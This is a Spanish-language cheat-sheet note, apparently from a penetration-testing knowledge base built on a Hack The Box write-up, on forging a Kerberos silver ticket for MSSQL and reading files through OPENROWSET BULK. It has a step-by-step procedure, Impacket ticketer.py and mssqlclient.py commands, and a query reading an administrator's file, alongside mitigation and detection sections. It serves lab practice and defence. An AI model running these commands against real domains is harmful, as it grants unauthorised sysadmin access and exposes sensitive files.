---
topic: MSSQL — silver ticket y OPENROWSET BULK
tags: [windows, mssql, kerberos, silver-ticket, openrowset, privesc]
---

# MSSQL — silver ticket y OPENROWSET BULK

[🌐 English](mssql-silver-ticket.en.md) | **Español**

## Concepto

Con el hash NTLM de la cuenta de servicio de MSSQL se puede forjar un TGS para el SPN `MSSQLSvc`. El ticket incluye grupos arbitrarios en el PAC, lo que permite entrar como `sysadmin`; `OPENROWSET(BULK ...)` lee archivos con esos grupos.

## Cuándo aplica

- Se tiene el hash o la contraseña de la cuenta de servicio MSSQL.
- Se conocen el dominio, el SID y el SPN.
- El servicio acepta Kerberos.

## Procedimiento

1. Calcular el NTLM de la contraseña o crackear el NetNTLMv2.
2. Obtener el SID del dominio y el RID de un grupo privilegiado.
3. Forjar el ticket con `ticketer.py` y usarlo con `mssqlclient.py`.
4. Leer archivos con `OPENROWSET`.
5. Buscar credenciales en historiales.

## Comandos

```bash
ticketer.py -nthash <HASH> -domain-sid <SID> -domain <DOMAIN> \
  -spn MSSQLSvc/DC01.<DOMAIN>:1433 -groups 1105 <USER>
KRB5CCNAME=<USER>.ccache mssqlclient.py -no-pass -k DC01.<DOMAIN>
SQL> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
```

## Variantes

- Silver ticket para otros SPN (HTTP, CIFS).
- Añadir varios RIDs de grupos.
- Combinar con relay NTLM o GodPotato.

## Limitaciones

- Se necesita el hash del servicio correcto.
- El SPN debe coincidir exactamente.
- Las cuentas protegidas pueden rechazar el ticket.

## Mitigación

- Usar gMSA y rotar contraseñas de servicio.
- Restringir `sysadmin` y auditar tickets.
- Firmar SMB y limitar NTLM.

## Detección

- Tickets con grupos inusuales.
- `OPENROWSET` leyendo rutas de administrador.
- Autenticación Kerberos desde hosts no habituales.

## Referencias

- [0xdf — Signed](https://0xdf.gitlab.io/2026/02/07/htb-signed.html)
- [Impacket — ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [Microsoft — OPENROWSET](https://learn.microsoft.com/en-us/sql/t-sql/functions/openrowset-transact-sql)
